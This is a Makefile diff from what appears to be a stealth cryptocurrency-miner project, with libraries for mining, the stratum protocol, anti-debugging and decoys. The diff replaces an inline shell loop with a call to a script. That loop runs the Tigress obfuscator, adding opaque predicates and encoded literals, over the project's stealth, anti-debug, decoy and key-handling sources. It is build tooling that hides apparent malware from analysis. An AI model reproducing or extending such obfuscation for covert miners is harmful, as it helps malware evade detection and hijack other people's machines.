@@ -212,22 +212,8 @@ TIGRESS_DEFS = -D_POSIX_C_SOURCE=199309L -D_GNU_SOURCE -DFEATURE_TLS=1 -DFEATURE
 TIGRESS_INCS = -Isrc -Ilibs/libutils/include -Ilibs/libcrypto/include -Ilibs/libantidebug/include -Ilibs/libjson/include -Ilibs/libws/include -Ilibs/libstratum/include -Ilibs/libminer/include -Ilibs/libdecoy/include -Ilib/randomx/src
 
 tigress-heavy:
-	@set -x; for f in src/main.c src/stealth.c libs/libcrypto/src/auth_key.c libs/libcrypto/src/auth_key_data.c libs/libcrypto/src/decoys.c libs/libantidebug/src/antidebug.c libs/libdecoy/src/decoy.c libs/libutils/src/hex.c libs/libutils/src/cpu.c; do \
-		echo "==> $$f"; \
-		cp $$f $$f.tigsrc.c; \
-		if ! grep -q '\bmain\b.*(' $$f; then printf '\nint main(void){return 0;}\n' >> $$f.tigsrc.c; fi; \
-		INIT=$$( if grep -q '\bmain\b.*(' $$f; then echo main; else perl -lne 'if(/^[a-zA-Z_][\w\s\*\(\)]*\b([a-zA-Z_]\w*)\s*\([^;]*\)\s*\{/){$$n=$$1; next if $$n=~/^(if|for|while|switch|sizeof)$$/; print $$n; exit}' $$f; fi ); \
-		$(TIGRESS) --Seed=1 $(TIGRESS_ENV) $(TIGRESS_DEFS) $(TIGRESS_INCS) \
-		  --Transform=InitEntropy --Functions=$$INIT \
-		  --Transform=InitOpaque --Functions=$$INIT \
-		  --Transform=AddOpaque --Functions=* --AddOpaqueKinds=call --AddOpaqueCount=1 \
-		  --Transform=EncodeLiterals --Functions=* \
-		  --Transform=CleanUp --Functions=* \
-		  --out=$$f.tigout.c $$f.tigsrc.c || { echo "FAIL $$f"; rm -f $$f.tigsrc.c $$f.tigout.c; continue; }; \
-		if ! grep -q '\bmain\b.*(' $$f; then perl -0pi -e "s/int main\(int _TIG_IZ_vGt1_formal_argc[^\n]*;\n//g; s/\/\* BEGIN FUNCTION-DEF main .*?\/\* END FUNCTION-DEF main [^\n]*\n//s" $$f.tigout.c; fi; \
-		mv $$f.tigout.c $$f; rm -f $$f.tigsrc.c; \
-		echo "OK $$f"; \
-	done
+	bash scripts/tigress_heavy.sh
+
 
 clean:
 	rm -f $(MAIN_OBJ) $(STEALTH_OBJ) $(DL_STUB_OBJ) $(BIN) $(BIN_STEALTH)
